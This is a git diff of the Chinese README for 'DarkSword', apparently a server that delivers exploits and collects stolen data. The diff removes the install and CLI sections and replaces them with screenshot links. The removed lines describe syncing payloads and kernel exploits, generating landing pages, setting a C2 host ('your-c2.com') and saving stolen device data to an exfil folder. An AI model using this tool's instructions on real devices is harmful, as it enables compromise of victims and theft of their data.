@@ -106,71 +106,8 @@ DarkSword/
 
 ## 快速开始
 
-### 环境要求
-
-- Python >= 3.9
-- 支持系统：Windows / Linux / macOS
-
-### 安装部署
-
-```bash
-# 1. 进入项目目录
-cd darksword-main
-
-# 2. 创建虚拟环境
-python3.9 -m venv venv
-
-# 3. 激活虚拟环境
-# Linux/Mac:
-source venv/bin/activate
-# Windows:
-.\venv\Scripts\activate
-
-# 4. 安装项目
-pip install -e .
-
-# 5. 同步 payloads
-darksword sync
-
-# 6. 下载内核漏洞
-darksword sync-kexploit
-
-# 7. 启动服务器
-darksword serve -H 0.0.0.0 -p 8080
-```
-
-### CLI 命令
-
-| 命令                            | 说明              |
-| ------------------------------- | ----------------- |
-| `darksword serve`             | 启动 HTTP 服务器  |
-| `darksword sync`              | 同步 payloads     |
-| `darksword sync-kexploit`     | 同步内核漏洞      |
-| `darksword list`              | 列出可用 payloads |
-| `darksword info`              | 显示漏洞信息      |
-| `darksword template generate` | 生成自定义着陆页  |
-
-### 服务器选项
-
-```bash
-darksword serve -H 0.0.0.0 -p 8080
-darksword serve -p 8443 --c2-host http://your-c2.com
-```
-
-- `-H, --host`: 监听地址
-- `-p, --port`: 端口
-- `--c2-host`: 自定义 C2 地址
-- `--redirect`: 回退重定向 URL
-
-## 数据存储
-
-窃取的数据自动保存到：
-
-```
-darksword-main/exfil/
-```
-
-保存格式：`{device}_{category}_{timestamp}.bin/txt`
+测试端
+![仪表盘](zhanshi/sb/sb0001.png)
 
 ## 界面展示
 
@@ -194,19 +131,13 @@ darksword-main/exfil/
 
 ![功能菜单](zhanshi/005.jpg)
 
-### 功能演示
+### 设备支持
 
 ![演示1](zhanshi/sb/sb.png)
 
-![演示2](zhanshi/sb/sb01.png)
 
-![演示3](zhanshi/sb/sb02.png)
 
-![演示4](zhanshi/sb/sb003.png)
 
-![演示5](zhanshi/sb/sb04.png)
-
-![演示6](zhanshi/sb/sb05.png)
 
 ## 适用场景
 
